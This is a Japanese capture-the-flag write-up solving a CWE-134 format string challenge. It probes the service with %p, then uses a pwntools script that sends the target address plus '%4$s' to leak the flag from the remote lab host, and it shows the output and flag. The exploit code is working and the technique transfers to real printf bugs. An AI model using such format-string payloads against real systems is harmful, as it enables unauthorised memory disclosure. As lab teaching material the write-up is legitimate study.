まずは、接続してみます。

CWE-134 を調べてみます。

```sh
$ nc nc.ctf.setodanote.net 26502
===========================================================
   _______          ________            __ ____  _  _
  / ____\ \        / /  ____|          /_ |___ \| || |
 | |     \ \  /\  / /| |__     ______   | | __) | || |_
 | |      \ \/  \/ / |  __|   |______|  | ||__ <|__   _|
 | |____   \  /\  /  | |____            | |___) |  | |
  \_____|   \/  \/   |______|           |_|____/   |_|

==========================================================

        |
flag    | [0x56652060] >> flag is here <<
        |

Ready > a
Your Inpur : a
```

CWE-134 は、書式文字列の問題らしいです。

試しに書式文字列を入力してみます。以降、バナーは貼りません。

なるほど、入力した文字列が、printf関数にそのまま入力されてそうです。

```sh
Ready > AAAA%p,%p,%p,%p,%p,%p
Your Inpur : AAAA0xffa26220,0xffa26628,0x56652306,0x41414141,0x252c7025,0x70252c70
```

上の実験で分かることは、以下です。

* フラグのアドレスは `0x56652060` ということだと思う（アドレスは毎回変化する）
* 32bitプログラム → 引数は全てスタックに積まれる
* 何回やっても、4番目に `AAAA` が出現する
* 入力した文字列をローカル変数（スタック）に取り込んでいる

`%p` は、単純に 16進数で表示しているだけです。

代わりに `%s` を使うと、アドレス `0x41414141` に格納されている文字列を表示することが出来ます。

よって、`0x41414141` ではなく、フラグのアドレスである `0x56652060` が格納されるようにして、
4番目を `%s` にすれば、フラグが表示されるはずです。

つまり、`AAAA` の代わりに、`0x56652060` を与えればいいということになります。

フラグのアドレスは毎回変わるので、Python で実装します。

今回必須ではないですが、printf関数には、ダイレクトパラメータアクセスというのがあります（全ての処理系にあるわけではないかもしれません）。

簡単に言うと、4番目の引数を文字列で表示したい場合に、`%4$s` を指定できます。

何がうれしいかと言うと、たくさん `%p` を並べなくてもよくなります。

これらを踏まえた実装が以下です。

```python
import os, sys
import argparse

from pwn import *

def main( args ):
    
    proc = remote( 'nc.ctf.setodanote.net', 26502 )
    
    cnt = 0
    while True:
        
        bstr = proc.recvline( timeout=2 )
        print( f"{cnt}: {bstr}, split(): {bstr.split()}" )
        
        if len(bstr) > 0:
            bstr_split = bstr.split()
            
            if b'flag' in bstr_split:
                
                adrs = int( bstr_split[2][1:-1], 16 )
                lst = [ (adrs      ) & 0xFF,
                        (adrs >>  8) & 0xFF,
                        (adrs >> 16) & 0xFF,
                        (adrs >> 24) & 0xFF ]
                
                #ss = adrs.to_bytes( 4, 'little' ) + "%p,%p,%p,%p,%p".encode('utf-8')
                #ss = adrs.to_bytes( 4, 'little' ) + "%p,%p,%p,%s,%p".encode('utf-8')
                ss = adrs.to_bytes( 4, 'little' ) + "%4$s".encode('utf-8')
                print( ss.hex() )
                
                bstr = proc.recv( timeout=2 )
                print( f"00: {bstr}" )
                
                proc.sendline( ss )
                
                bstr = proc.recv( timeout=2 )
                print( f"00: {bstr}" )
        
        else:
            cnt += 1

if __name__ == '__main__':
    
    main( args )
```

実行します。

```sh
$ python tmp.py
[+] Opening connection to nc.ctf.setodanote.net on port 26502: Done
0: b'===========================================================\n', split(): [b'===========================================================']
0: b'   _______          ________            __ ____  _  _   \n', split(): [b'_______', b'________', b'__', b'____', b'_', b'_']
0: b'  / ____\\ \\        / /  ____|          /_ |___ \\| || |  \n', split(): [b'/', b'____\\', b'\\', b'/', b'/', b'____|', b'/_', b'|___', b'\\|', b'||', b'|']
0: b' | |     \\ \\  /\\  / /| |__     ______   | | __) | || |_ \n', split(): [b'|', b'|', b'\\', b'\\', b'/\\', b'/', b'/|', b'|__', b'______', b'|', b'|', b'__)', b'|', b'||', b'|_']
0: b' | |      \\ \\/  \\/ / |  __|   |______|  | ||__ <|__   _|\n', split(): [b'|', b'|', b'\\', b'\\/', b'\\/', b'/', b'|', b'__|', b'|______|', b'|', b'||__', b'<|__', b'_|']
0: b' | |____   \\  /\\  /  | |____            | |___) |  | |  \n', split(): [b'|', b'|____', b'\\', b'/\\', b'/', b'|', b'|____', b'|', b'|___)', b'|', b'|', b'|']
0: b'  \\_____|   \\/  \\/   |______|           |_|____/   |_|  \n', split(): [b'\\_____|', b'\\/', b'\\/', b'|______|', b'|_|____/', b'|_|']
0: b'                                                        \n', split(): []
0: b'========================================================== \n', split(): [b'==========================================================']
0: b'\n', split(): []
0: b'        | \n', split(): [b'|']
0: b'flag    | [0x565c6060] >> flag is here << \n', split(): [b'flag', b'|', b'[0x565c6060]', b'>>', b'flag', b'is', b'here', b'<<']
60605c5625342473
00: b'        | \n\nReady > '
00: b'Your Inpur : ``\\Vflag{Homenum_Revelio_1989}\n'
Traceback (most recent call last):
  File "/home/user/svn/experiment/python/1989.py", line 59, in <module>
    main( args )
  File "/home/user/svn/experiment/python/1989.py", line 13, in main
    bstr = proc.recvline( timeout=2 )
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 498, in recvline
    return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
    res = self.recv(timeout=self.timeout)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 106, in recv
    return self._recv(numb, timeout) or b''
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to nc.ctf.setodanote.net port 26502
```

`flag{Homenum_Revelio_1989}` でした。
